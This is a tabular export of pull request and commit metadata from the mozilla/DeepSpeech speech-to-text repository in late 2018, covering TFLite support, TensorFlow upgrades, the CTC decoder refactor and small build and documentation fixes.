2640,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9555743bae3cf5af87b83d0395bc7b37e1cf19b9,"Merge pull request #1285 from lissyx/update-tf-master

Update tf master

X-DeepSpeech: NOBUILD"
2641,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecdf6520358a5cc8cfeca3fb3689614159fc9f0f,Switch to new TensorFlow master artifacts
2642,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6efaddfd5d16e7b0f2dc403d361fd372712ca55,"Merge pull request #1286 from lissyx/update-tf-master

Switch to new TensorFlow master artifacts"
2643,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,326532a131a7318dde97ae12cc5e5cc3daa096c7,Merge remote-tracking branch 'upstream/master' into linaro-gcc72
2644,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,befa59b41d9d1ece857cd288512801b29d4a190f,Update TensorFlow master version
2645,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41b2da0bc370969a1c7db4726b1b05a629edf340,"Switch to GCC 7.2 from Linaro and Raspbian Stretch

Fixes #1304"
2646,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,859cafca3a4f6aec98e23e7477573a62918d3c22,"Merge pull request #1307 from lissyx/linaro-gcc72

Linaro gcc72"
2647,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,710a729dda34e0a429432506a00600a4580e7d91,Update to TensorFlow master with PYTHON_BIN_PATH forced
2648,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69aa316c88ab3f709dd642223d7f51aa68ceb147,Add TFLite engine
2649,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49ccf7f33b603350d0ed88c300dbcea42b8276ce,Enable TFLite on Android
2650,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,456da33f9573ca8d4bafe54baf99d7665ed62ac2,"Building native_client on Android

$ ndk-build APP_PLATFORM=android-21 APP_BUILD_SCRIPT=$(pwd)/Android.mk NDK_PROJECT_PATH=$(pwd) APP_STL=c++_shared TFDIR=... TARGET_ARCH_ABI=arm64-v8a"
2651,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c10cdf08cae9eca5b12ec229cf89156514bca67d,Add JNI + Android example app
2652,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e245ce5bf7550422190536f121baf0d0c15dd18,Add Android TaskCluster build
2653,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,672fad9a9b8ff498aa6d288d47813360dd54e825,Update TensorFlow artifacts
2654,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c78a3e57ae612521a5f2954b65ead21505cd0190,Cleanup SUMMARIZE_GRAPH_BINARY
2655,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c67f66f86434d57fc75ed8fc8e1df80be1226a58,Cleanup CONVERT_GRAPHDEF_MEMMAPPED
2656,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92ded598fbdc5bdce0bf212986d8512b4bc93196,Call toco during export
2657,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26f7bc30f03c424cb918e53dd9decc7a8c81991b,Move to TensorFlow r1.12
2658,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc85977b6a43d5194625637373178419b090039b,"Merge pull request #1690 from lissyx/convert-toco

Convert toco"
2659,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c310b7f45dd53b25a3eecc69c3bffdc28d198dd,"Bump VERSION to 0.4.0-alpha.0

X-DeepSpeech: NOBUILD"
2660,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8b0abd5364e154c9c5f057386c9c77a971c39462,"Merge pull request #1692 from lissyx/bump-v0.4.0-alpha.0

Bump VERSION to 0.4.0-alpha.0"
2661,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ce8f41398c0c9dab2134fb3b04ae3c61d62300d,"Updated making mmap-able model part of README.md

In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error."
2662,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a520e8b5725e59c86fc9a55b1db7ba1f73f29c9,"Merge pull request #1698 from j-a-h-i-r/master

Updated making mmap-able model part of README.md"
2663,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,740e8584bde902c3f8c14eacd1064df6ba169e28,Add benchmark_model tests
2664,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2438397ce3795f802a864a58e31286db12b3e89,Update TensorFlow r1.12
2665,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c71263790dd2bea82032a73a8e4947f1ab06f35,"Merge pull request #1697 from lissyx/add-benchmark_model-tasks

Add benchmark model tasks"
2666,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,706b54f26470ef031fa3aa4d1b90f90d3b7ec6ff,Merge remote-tracking branch 'upstream/master' into update-tf-master
2667,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8f184d6c9f5b407ca81d00b5476ea252dd35903,Ensure TensorFlow master
2668,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a42344a37baf0173d7515e3e1c3f1f81c009b076,Update TensorFlow master
2669,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1707,1707,error message and script for looking at chars in transcripts,added extra error message that gets thrown when the alphabet and transcripts dont match,JRMeyer,8389864,2018-11-06T02:33:34Z,CONTRIBUTOR,False,132,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc0e2ee40f565f787aede178c7a54f6438fd756c,error message and script for looking at chars in transcripts
2670,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1707,1707,error message and script for looking at chars in transcripts,added extra error message that gets thrown when the alphabet and transcripts dont match,JRMeyer,8389864,2018-11-06T02:33:34Z,CONTRIBUTOR,False,132,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83f20c2135c4ca16b542bf031d48c6174fe389a9,data filter and comput
2671,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1698,1698,Updated making mmap-able model part of README.md,"In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error.",j-a-h-i-r,21159766,2018-11-05T18:57:50Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ce8f41398c0c9dab2134fb3b04ae3c61d62300d,"Updated making mmap-able model part of README.md

In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error."
2672,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1697,1697,Add benchmark model tasks,,lissyx,1645737,2018-11-05T15:04:38Z,COLLABORATOR,True,54,12,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,740e8584bde902c3f8c14eacd1064df6ba169e28,Add benchmark_model tests
2673,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1697,1697,Add benchmark model tasks,,lissyx,1645737,2018-11-05T15:04:38Z,COLLABORATOR,True,54,12,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2438397ce3795f802a864a58e31286db12b3e89,Update TensorFlow r1.12
2674,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3255f2342685af2602ac156b836ce05d944b5455,ctcdecode binding fixes
2675,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc2d9f427d0ccb0a0f8919e7d5cb530c1cd7c9d5,"Remove training tests with deepspeech package

The presence of the package no longer influences training."
2676,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0333728ebcbe7a9f6fa2a22b3d9587e139a32df,Build decoder package in automation
2677,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53e3e1212bcf75c5bbe389c5d533e2acfe2731fa,Remove old CTC decoder code
2678,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60fb5ad04c8a070c8db4c03313a089921ffb566f,Remove old versions of decoder binary files
2679,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56dc024d295f386b218def789f16187f2e808f85,"Centralize WER report code into evaluate.py, call it from DeepSpeech.py"
2680,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d05c9af464fba17326d7651434088ae5c8a0478,Address review comments
2681,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38b54479a9ee0941994b4bedf822ad208e1b97f8,Add documentation and remove unneeded build of decoder packages
2682,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c65c22fe313eafde12c313fcb409e6a51817ce82,Move globals handling out of util/coordinator.py
2683,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5bcecbe404b9ee2128ae80d0f07336c55c7cdf8,Address more review comments
2684,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5cb1aff5313fddc936305c10ade6eaa867e624b3,Rename config singleton from C to Config
2685,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0dcb1f87c59263a07b1836a39824badeb71a9719,Clean up evaluate.py
2686,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfed8ccd4f4cfca41a008a1c1967d01ecd64f849,Cache common objects in decoder build
2687,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1694,1694,Converting newline encodings from Windows to Linux,"Fix issue when building image in Windows
ex : /bin/bash: native_client/ds_git_version.sh: /bin/sh^M: bad interpreter: No such file or directory",mouradski,14250321,2018-11-02T23:17:49Z,NONE,False,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05e8447cd8fb77e1ca07c792ee2830dd8cc512b1,"Converting newline encodings from Windows to Linux

Fix issue when building image in Windows
ex : /bin/bash: native_client/ds_git_version.sh: /bin/sh^M: bad interpreter: No such file or directory"
2688,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1694,1694,Converting newline encodings from Windows to Linux,"Fix issue when building image in Windows
ex : /bin/bash: native_client/ds_git_version.sh: /bin/sh^M: bad interpreter: No such file or directory",mouradski,14250321,2018-11-02T23:17:49Z,NONE,False,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75a2406d1d834e9f2a68b8a773e0259004364d74,Update Dockerfile
2689,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb4551caa992992f8cc162fe6d540f72c179b62a,Extend Python Alphabet with config file and decode method
2690,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,440893c58d668cc0d975c48b5fc3971feaf9c7c3,"Simplify ctcdecode API signatures to avoid nested STL structures

Flatten structure to avoid nested STL structures which are awkward to
wrap with SWIG and slower at runtime."
2691,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5e7dfc4b737fe13f3d2479f9acc1a9c760679ad,Add Python/NumPy bindings to ctcdecode
2692,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d55c9451240916bd2dda6d87292d38e67976051,Compute correct features length in preprocess.py
2693,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9e1ffc0fc342841c11d1c094f01ae1edb4faed6,Use ctcdecode bindings in evaluate.py
2694,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1693,1693,Expose ctcdecode to Python and use it in evaluate.py,This doesn't yet remove libctc_decoder_with_kenlm.so and its users. Let's see if this PR passes tests.,reuben,477142,2018-11-02T17:02:32Z,MEMBER,True,3872,160,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7144e1d387532a2323e5dd3a7bfdeda79a0b63c,Address review comments
2695,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1692,1692,Bump VERSION to 0.4.0-alpha.0,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-11-01T11:17:45Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c310b7f45dd53b25a3eecc69c3bffdc28d198dd,"Bump VERSION to 0.4.0-alpha.0

X-DeepSpeech: NOBUILD"
2696,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1690,1690,Convert toco,,lissyx,1645737,2018-10-31T06:37:38Z,COLLABORATOR,True,83,56,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c78a3e57ae612521a5f2954b65ead21505cd0190,Cleanup SUMMARIZE_GRAPH_BINARY
2697,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1690,1690,Convert toco,,lissyx,1645737,2018-10-31T06:37:38Z,COLLABORATOR,True,83,56,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c67f66f86434d57fc75ed8fc8e1df80be1226a58,Cleanup CONVERT_GRAPHDEF_MEMMAPPED
2698,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1690,1690,Convert toco,,lissyx,1645737,2018-10-31T06:37:38Z,COLLABORATOR,True,83,56,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92ded598fbdc5bdce0bf212986d8512b4bc93196,Call toco during export
2699,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1690,1690,Convert toco,,lissyx,1645737,2018-10-31T06:37:38Z,COLLABORATOR,True,83,56,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26f7bc30f03c424cb918e53dd9decc7a8c81991b,Move to TensorFlow r1.12
2700,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c34fc5b7ac9fdeae656f7098947b25c8264fa647,Import parlance/ctcdecode into repository
2701,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0002d0feedbe003cf8c799719a44bd73857cb831,Integrate ctcdecode into build system
2702,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13,Change Alphabet class to match ctcdecode needs
2703,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,770d742cd573b79d048ed5330bf4988c6cd9f4f7,"Adjust ctcdecode to use our Alphabet code, support using trie files"
